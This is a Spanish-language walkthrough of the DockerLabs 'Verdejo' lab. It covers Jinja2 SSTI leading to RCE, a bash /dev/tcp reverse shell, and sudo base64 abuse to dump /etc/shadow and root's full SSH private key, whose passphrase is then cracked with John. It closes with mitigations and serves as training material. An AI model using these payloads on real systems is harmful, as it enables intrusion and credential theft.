# Verdejo — DockerLabs Writeup

**Platform:** DockerLabs | **Difficulty:** Easy | **Target IP:** 172.18.0.2 | 

## Descripcion 

Laboratorio para practicar las vulnerabilidades XSS y SSTI, con escalada de privilegios crackeando hashes.

## Attack chain

## Attack chain:

**Nmap → Web Enumeration → SSTI Detection (Jinja2) → Remote Code Execution (RCE) → Reverse Shell → verde Access → Sudo Misconfiguration (base64) → Root SSH Private Key Disclosure → Passphrase Cracking (John the Ripper) → SSH Access (root)**

## 1. Analisis y escaneo del objetivo.

```text
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/02-faciles/verdejo]
└─$ nmap -sV -sC -p- 172.17.0.2 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-17 20:08 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000070s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 dc:98:72:d5:05:7e:7a:c0:14:df:29:a1:0e:3d:05:ba (ECDSA)
|_  256 39:42:28:c9:c8:fa:05:de:89:e6:37:62:4d:8b:f3:63 (ED25519)
80/tcp   open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Apache2 Debian Default Page: It works
8089/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-title: Dale duro bro
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
MAC Address: 92:1D:A8:A8:30:F5 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.00 seconds
                                                               
```
Tres servicios expuestos: SSH, un Apache con la página default de Debian, y un servidor Flask/Werkzeug con el título "Dale duro bro" en el puerto `8089`.

Ingresamos a la pagina de apache, pero se encuentra por defecto

![pagina](./images/pagina.png)

Exploramos el puerto `8089` y encontramos la siguiente pagina.

![pagina](./images/8089.png)

Continuamos mas en detalle la exploracion de dicha pagina.

## 2. Explotación — SSTI en el puerto 8089

Al visitar `http://172.17.0.2:8089/` aparece un formulario simple con un campo user:

```text
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/02-faciles/verdejo]
└─$ curl -i http://172.17.0.2:8089/
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.11.2
Date: Sun, 18 Oct 2026 00:32:56 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 537
Connection: close

    <html><head><title>Dale duro bro</title><style>body {margin: 90px; background-image: url('/static/1366_2000.jpg');}<style></head><body>
    
        <h1>Nada interesante que buscar</h1>
        <form>
        <input name="user" style="border: 2px solid #0000FF; padding: 10px; border-radius: 10px; margin-bottom: 25px;" vlue="Hola"><br>
        <input type="submit" value="No hay nada enserio, no toques" style="border: 0px; padding: 5px 20px ; color: #0000F;">
        </form>
        
    <br><p style="margin-top: 30px;">

```
El formulario no define method, por lo que envía los datos por GET. Al mandar un valor cualquiera, este se refleja directamente en la respuesta:

```
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/02-faciles/verdejo]
└─$ curl -s "http://172.17.0.2:8089/?user=PRUEBA123"

    <html><head><title>Dale duro bro</title><style>body {margin: 90px; background-image: url('/static/1366_2000.jpg');}</style></head><body>
    
        <h1>Hola PRUEBA123</h1>
        No hay nada aqui de verdad.<br>
        
    <br><p style="margin-top: 30px;">

```
![prueba](./images/prueba.png)

### Confirmación del SSTI

Se prueba una expresión matemática típica de Jinja2:

```
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/02-faciles/verdejo]
└─$ curl -i -s -G "http://172.17.0.2:8089/" --data-urlencode "user={{7*7}}"
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.11.2
Date: Mon, 19 Oct 2026 00:59:54 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 263
Connection: close


    <html><head><title>Dale duro bro</title><style>body {margin: 90px; background-image: url('/static/1366_2000.jpg');}</style></head><body>
    
        <h1>Hola 49</h1>
        No hay nada aqui de verdad.<br>
        
    <br><p style="margin-top: 30px;">
                                         
```
![prueba](./images/prueba2.png)

El input no se refleja como texto literal, se evalúa como código Jinja2 — confirmando Server Side Template Injection.

### De SSTI a RCE

Usando la cadena clásica de escape del sandbox de Jinja2 para llegar a os.popen:

```
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/02-faciles/verdejo]
└─$ curl -s -G "http://172.17.0.2:8089/" --data-urlencode "user={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"

    <html><head><title>Dale duro bro</title><style>body {margin: 90px; background-image: url('/static/1366_2000.jpg');}</style></head><body>
    
        <h1>Hola uid=1000(verde) gid=1000(verde) groups=1000(verde)
</h1>
        No hay nada aqui de verdad.<br>
        
    <br><p style="margin-top: 30px;">
                                          
```
![prueba](./images/prueba3.png)

RCE confirmado como el usuario verde.

### Reverse shell

```
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/02-faciles/verdejo]
└─$ curl -s -G "http://172.17.0.2:8089/" --data-urlencode "user={{ self.__init__.__globals__.__builtins__.__import__('os').system('bash -c \"bash -i >& /dev/tcp/172.17.0.1/4444 0>&1\"') }}"

```
Con un listener previo:

```
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/02-faciles/verdejo]
└─$ nc -lvnp 4444
listening on [any] 4444 ...

```

Se obtiene shell como verde.

```
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/02-faciles/verdejo]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 57712
bash: cannot set terminal process group (94): Inappropriate ioctl for device
bash: no job control in this shell
verde@4e95c4af10d2:~$      

```
Mejora de la shell (TTY)

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

```
Esto permite usar `sudo`, `su` y otros comandos que requieren terminal interactiva.


## 3. Escalada de privilegios

Enumeración de privilegios sudo

```text

verde@4e95c4af10d2:~$ sudo -l
Matching Defaults entries for verde on 4e95c4af10d2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User verde may run the following commands on 4e95c4af10d2:
    (root) NOPASSWD: /usr/bin/base64
verde@4e95c4af10d2:~$ 


```
El usuario `verd`e puede ejecutar `/usr/bin/base64` como `root` sin contraseña.

Lectura arbitraria de archivos como `root`

Esta versión de `base64` no tiene opción `-o/--output`, así que solo sirve para lectura (cualquier intento de redirigir la salida hacia un archivo protegido falla porque la redirección la abre el propio shell sin privilegios, no el proceso `root`). Se descarta la escritura en `/etc/passwd`.

Lectura de `/etc/shadow`:

```
verde@4e95c4af10d2:~$ sudo /usr/bin/base64 /etc/shadow | base64 -d
root:*:19856:0:99999:7:::
daemon:*:19856:0:99999:7:::
bin:*:19856:0:99999:7:::
sys:*:19856:0:99999:7:::
sync:*:19856:0:99999:7:::
games:*:19856:0:99999:7:::
man:*:19856:0:99999:7:::
lp:*:19856:0:99999:7:::
mail:*:19856:0:99999:7:::
news:*:19856:0:99999:7:::
uucp:*:19856:0:99999:7:::
proxy:*:19856:0:99999:7:::
www-data:*:19856:0:99999:7:::
backup:*:19856:0:99999:7:::
list:*:19856:0:99999:7:::
irc:*:19856:0:99999:7:::
_apt:*:19856:0:99999:7:::
nobody:*:19856:0:99999:7:::
systemd-network:!*:19864::::::
systemd-timesync:!*:19864::::::
messagebus:!:19864::::::
sshd:!:19864::::::
verde:$y$j9T$PaWEspPyUh1TjvyxpW/g70$Q10PVAPkYN321DGTV/xNdjI2HdiSnUTM5zEkxMlaG71:19864:0:99999:7:::
verde@4e95c4af10d2:~$ 

```
El hash de root es * (login por contraseña deshabilitado), sin nada que crackear ahí.

### Robo de la clave privada SSH de root

La clave privada SSH es el archivo que le permite a root autenticarse sin contraseña del sistema (el servidor verifica que quien se conecta posee la clave privada asociada a la pública que tiene autorizada). Normalmente solo root puede leerla, pero el privilegio de sudo base64 sin restricciones permite leer cualquier archivo del sistema, así que se usa para copiarla y reutilizarla como propia:

```
verde@4e95c4af10d2:~$ sudo /usr/bin/base64 /root/.ssh/id_rsa | base64 -d
-----BEGIN OPENSSH PRIVATE KEY-----
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
vEACJSQrQKz9mWnewtRP5pzZk=
-----END OPENSSH PRIVATE KEY-----

```
Se obtiene la clave privada completa. Está protegida por passphrase (`aes256-ctr `+ `bcrypt` en el header).

Se confirma además que corresponde a la clave autorizada:

```
verde@4e95c4af10d2:~$ sudo /usr/bin/base64 /root/.ssh/authorized_keys | base64 -d
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDbTQGZZWBBVRdf31TPoa0wcuFMcqXJhxfX9HqhmcePAyZMxtgChQzYmmzRgkYH6jBTXSnNanTe4A0KMEc/77xWmJzvgvKyjmFmbvSu9sJuYABrP7yiTgiWY752nL4jeX5tXWT3t1XchSfFg50CqSfoKHXV3Jl/vv/alUFgiKkQj6Bt3KogX4QXibU34xGIc24tnHMvph0jdLrR7BigwDkY2jZKOt0aa7zBz5R2qwS3gT6cmHcKKHfv3pEljglomNCHhHGnEZjyVYFvSp+DxgOvmn1/pSEzUU4kP/42fNSeERLcyHdVZvUt9PyPJpDvEQvULkqvicRSZ4VI0WmBrPwWWth4SMFOg+wnEIGvN4tXtasHzHvdK9Lue2e3YiiFSOOkl0ZjzeYSBFZg3bMvu32SXKrvPjcsDlG1eByfqNV+lp2g6EiGBk1eyrqb3INWp/KqVHvDObgC8aqg3SGI/6LM3wGdZ5tdEDEtELeHrrPtS/Xhhnq/cfMNdrV9bsba/z9amMVWhAAlfX8xb4W7rdhgGH20PxaOfCZYQM6qjAClLBWP/rsX/3FGopi7/fn6sD728szK2Q3nOoco+kBAdovd5vLOJxhbTec/QPPvNNS2zvGYv4liNoRQ9x8otaYdV++vvWPUk/oI3IaL15PWuD5o6SWTvpdSRY3OJhDVRR16jQ== root@2b3afb1aee62
verde@4e95c4af10d2:~$ 
```

Crackeo de la passphrase con John the Ripper
```
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/02-faciles/verdejo]
└─$ nano id_rsa_root
                                                                                                                        
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/02-faciles/verdejo]
└─$ ssh2john id_rsa_root > id_rsa_hash.txt

┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/02-faciles/verdejo]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
honda1           (id_rsa_root)     
1g 0:00:00:58 DONE (2026-10-18 22:37) 0.01707g/s 60.63p/s 60.63c/s 60.63C/s Password1..01234
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

Passphrase recuperada: `honda1`

Acceso como `root`

`chmod 600` es obligatorio porque `SSH` rechaza usar una clave privada con permisos demasiado abiertos (solo el dueño debe poder leerla); `-i` le indica al cliente qué archivo de clave usar en vez del default:

```
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/02-faciles/verdejo]
└─$ chmod 600 id_rsa_root
                                                                                                                        
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/02-faciles/verdejo]
└─$ ssh -i id_rsa_root root@172.17.0.2
Enter passphrase for key 'id_rsa_root': 
Linux 4e95c4af10d2 7.1.5+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 7.1.5-1kali1 (2026-07-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Oct 19 00:24:36 2026 from 172.17.0.1
root@4e95c4af10d2:~# id
uid=0(root) gid=0(root) groups=0(root)
root@4e95c4af10d2:~# whoami
root
root@4e95c4af10d2:~# 
```

# Conclusión

A partir del escaneo inicial con **Nmap**, se identificaron tres servicios expuestos: SSH en el puerto `22`, Apache en el puerto `80` y un servidor Werkzeug en el puerto `8089`. Mientras que el sitio de Apache mostraba la página por defecto de Debian, la aplicación del puerto `8089` presentaba un formulario que reflejaba el valor ingresado por el usuario.

Al realizar las pruebas, se confirmó una vulnerabilidad de **Server-Side Template Injection (SSTI)** en Jinja2. Mediante la inyección de expresiones y el acceso a funciones de Python, fue posible ejecutar comandos en el sistema y obtener una **reverse shell** como el usuario `verde`.

Posteriormente, mediante la enumeración de permisos con `sudo -l`, se descubrió que `verde` podía ejecutar `/usr/bin/base64` como `root` sin contraseña. Este permiso permitía leer archivos protegidos, por lo que se utilizó para obtener la clave privada SSH de `root` y comprobar que correspondía a la clave autorizada.

Finalmente, la clave privada obtenida estaba protegida por una passphrase. Mediante **John the Ripper** y el diccionario `rockyou.txt`, se logró recuperar la contraseña `honda1`. Con la clave y su passphrase, fue posible iniciar sesión por SSH como `root`, completando la escalada de privilegios.

| Vulnerabilidad / Técnica | Impacto | Mitigación |
|---|---|---|
| **SSTI en Jinja2** | Permite evaluar expresiones del lado del servidor y, en este caso, ejecutar comandos del sistema. | Evitar procesar entradas del usuario como plantillas y aplicar una separación segura entre datos y código. |
| **SSTI utilizada para obtener RCE** | Permite ejecutar comandos con los privilegios del proceso vulnerable y obtener una shell como `verde`. | Corregir la implementación de las plantillas, restringir el acceso a funciones sensibles y aplicar el principio de mínimo privilegio. |
| **Permisos de `sudo` sobre `base64`** | Permiten leer archivos protegidos como `/etc/shadow` y la clave privada SSH de `root`. | Restringir los permisos de `sudo` y evitar conceder privilegios elevados sobre herramientas que permitan leer archivos arbitrarios. |
| **Clave privada SSH de `root` accesible** | Permite obtener una credencial de autenticación privilegiada si también se consigue su passphrase. | Proteger las claves privadas, restringir su acceso y evitar que puedan leerse mediante comandos privilegiados. |
| **Passphrase débil** | Permite recuperar la contraseña de la clave privada mediante ataques de diccionario. | Utilizar passphrases largas, únicas y resistentes a ataques de diccionario. |

## Recomendaciones generales

- Validar y tratar de forma segura las entradas recibidas por las aplicaciones web.
- Evitar vulnerabilidades SSTI que puedan derivar en ejecución remota de comandos.
- Aplicar el principio de mínimo privilegio en las reglas de `sudo`.
- No conceder permisos privilegiados sobre herramientas que permitan acceder a archivos arbitrarios.
- Proteger las claves privadas SSH y limitar su acceso a los usuarios autorizados.
- Utilizar passphrases robustas y revisar periódicamente las configuraciones de autenticación y privilegios.
